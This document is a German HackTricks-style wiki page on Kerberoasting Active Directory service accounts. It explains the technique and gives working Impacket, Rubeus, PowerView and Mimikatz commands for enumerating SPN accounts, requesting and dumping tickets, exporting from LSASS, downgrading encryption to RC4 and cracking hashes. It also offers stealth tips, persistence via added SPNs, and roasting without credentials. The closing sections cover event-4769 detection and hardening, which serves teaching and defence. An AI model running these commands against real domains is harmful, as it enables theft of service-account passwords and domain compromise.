# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting konzentriert sich auf den Erwerb von TGS-Tickets, insbesondere solchen, die mit Diensten verbunden sind, die unter Benutzerkonten in Active Directory (AD) betrieben werden, ausgenommen Computerkonten. Die Verschlüsselung dieser Tickets verwendet Schlüssel, die aus Benutzerpasswörtern stammen, was ein Offline-Cracking von Anmeldeinformationen ermöglicht. Die Verwendung eines Benutzerkontos als Dienst wird durch eine nicht leere ServicePrincipalName (SPN)-Eigenschaft angezeigt.

Jeder authentifizierte Domänenbenutzer kann TGS-Tickets anfordern, sodass keine speziellen Berechtigungen erforderlich sind.

### Wichtige Punkte

- Zielt auf TGS-Tickets für Dienste ab, die unter Benutzerkonten ausgeführt werden (d.h. Konten mit gesetztem SPN; keine Computerkonten).
- Tickets sind mit einem Schlüssel verschlüsselt, der aus dem Passwort des Dienstkontos abgeleitet ist und offline geknackt werden kann.
- Keine erhöhten Berechtigungen erforderlich; jedes authentifizierte Konto kann TGS-Tickets anfordern.

> [!WARNING]
> Die meisten öffentlichen Tools ziehen es vor, RC4-HMAC (etype 23) Diensttickets anzufordern, da sie schneller zu knacken sind als AES. RC4 TGS-Hashes beginnen mit `$krb5tgs$23$*`, AES128 mit `$krb5tgs$17$*` und AES256 mit `$krb5tgs$18$*`. Viele Umgebungen wechseln jedoch zu AES-only. Gehen Sie nicht davon aus, dass nur RC4 relevant ist.
> Vermeiden Sie auch das „spray-and-pray“-Roasting. Rubeus’ Standard-Kerberoast kann Tickets für alle SPNs abfragen und anfordern und ist laut. Zählen Sie zuerst interessante Prinzipale auf und zielen Sie auf diese ab.

### Angriff

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Multi-Feature-Tools einschließlich Kerberoast-Überprüfungen:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerieren Sie kerberoastbare Benutzer
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technik 1: Fordern Sie TGS an und dumpen Sie aus dem Speicher
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technik 2: Automatische Werkzeuge
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Eine TGS-Anfrage erzeugt das Windows-Sicherheitsereignis 4769 (Ein Kerberos-Dienstticket wurde angefordert).

### OPSEC und AES-only Umgebungen

- Fordern Sie absichtlich RC4 für Konten ohne AES an:
- Rubeus: `/rc4opsec` verwendet tgtdeleg, um Konten ohne AES aufzulisten und fordert RC4-Diensttickets an.
- Rubeus: `/tgtdeleg` mit kerberoast löst ebenfalls RC4-Anfragen aus, wo möglich.
- Rösten Sie AES-only Konten, anstatt stillschweigend zu fehlschlagen:
- Rubeus: `/aes` listet Konten mit aktivem AES auf und fordert AES-Diensttickets an (etype 17/18).
- Wenn Sie bereits ein TGT (PTT oder aus einer .kirbi) besitzen, können Sie `/ticket:<blob|path>` mit `/spn:<SPN>` oder `/spns:<file>` verwenden und LDAP überspringen.
- Zielgerichtet, drosseln und weniger Lärm:
- Verwenden Sie `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` und `/jitter:<1-100>`.
- Filtern Sie nach wahrscheinlich schwachen Passwörtern mit `/pwdsetbefore:<MM-dd-yyyy>` (ältere Passwörter) oder zielen Sie auf privilegierte OUs mit `/ou:<DN>`.

Beispiele (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Knacken
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistenz / Missbrauch

Wenn Sie ein Konto kontrollieren oder ändern können, können Sie es kerberoastable machen, indem Sie einen SPN hinzufügen:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Ein Konto herabstufen, um RC4 für einfacheres Knacken zu aktivieren (erfordert Schreibrechte auf dem Zielobjekt):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Sie finden nützliche Tools für Kerberoast-Angriffe hier: https://github.com/nidem/kerberoast

Wenn Sie diesen Fehler von Linux finden: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`, liegt das an einer lokalen Zeitabweichung. Synchronisieren Sie mit dem DC:

- `ntpdate <DC_IP>` (veraltet in einigen Distributionen)
- `rdate -n <DC_IP>`

### Detection

Kerberoasting kann heimlich sein. Suchen Sie nach Event ID 4769 von DCs und wenden Sie Filter an, um Rauschen zu reduzieren:

- Schließen Sie den Dienstnamen `krbtgt` und Dienstnamen, die mit `$` enden (Computerkonten), aus.
- Schließen Sie Anfragen von Maschinenkonten (`*$$@*`) aus.
- Nur erfolgreiche Anfragen (Fehlercode `0x0`).
- Verfolgen Sie Verschlüsselungstypen: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Alarmieren Sie nicht nur bei `0x17`.

Beispiel PowerShell-Triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Zusätzliche Ideen:

- Baseline normale SPN-Nutzung pro Host/Benutzer; Alarm bei großen Ausbrüchen von unterschiedlichen SPN-Anfragen von einem einzelnen Principal.
- Ungewöhnliche RC4-Nutzung in AES-härteten Domänen kennzeichnen.

### Minderung / Härtung

- Verwenden Sie gMSA/dMSA oder Maschinenkonten für Dienste. Verwaltete Konten haben 120+ Zeichen lange zufällige Passwörter und rotieren automatisch, was Offline-Cracking unpraktisch macht.
- Erzwingen Sie AES für Dienstkonten, indem Sie `msDS-SupportedEncryptionTypes` auf AES-only (dezimal 24 / hex 0x18) setzen und dann das Passwort rotieren, damit AES-Schlüssel abgeleitet werden.
- Wo möglich, deaktivieren Sie RC4 in Ihrer Umgebung und überwachen Sie versuchte RC4-Nutzung. Auf DCs können Sie den Registrierungswert `DefaultDomainSupportedEncTypes` verwenden, um Standards für Konten ohne `msDS-SupportedEncryptionTypes` festzulegen. Testen Sie gründlich.
- Entfernen Sie unnötige SPNs von Benutzerkonten.
- Verwenden Sie lange, zufällige Passwörter für Dienstkonten (25+ Zeichen), wenn verwaltete Konten nicht möglich sind; verbieten Sie gängige Passwörter und führen Sie regelmäßig Audits durch.

### Kerberoast ohne ein Domänenkonto (AS-requested STs)

Im September 2022 zeigte Charlie Clark, dass es möglich ist, ein Dienstticket über ein manipuliertes KRB_AS_REQ zu erhalten, wenn ein Principal keine Vor-Authentifizierung benötigt, indem der sname im Anfragekörper geändert wird, wodurch effektiv ein Dienstticket anstelle eines TGTs erhalten wird. Dies spiegelt AS-REP-Roasting wider und erfordert keine gültigen Domänenanmeldeinformationen.

Siehe Details: Semperis Bericht „Neue Angriffswege: AS-requested STs“.

> [!WARNING]
> Sie müssen eine Liste von Benutzern bereitstellen, da Sie ohne gültige Anmeldeinformationen mit dieser Technik kein LDAP abfragen können.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Verwandt

Wenn Sie AS-REP roastbare Benutzer anvisieren, siehe auch:

{{#ref}}
asreproast.md
{{#endref}}

## Referenzen

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsofts Anleitung zur Minderung von Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting Dokumentation: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
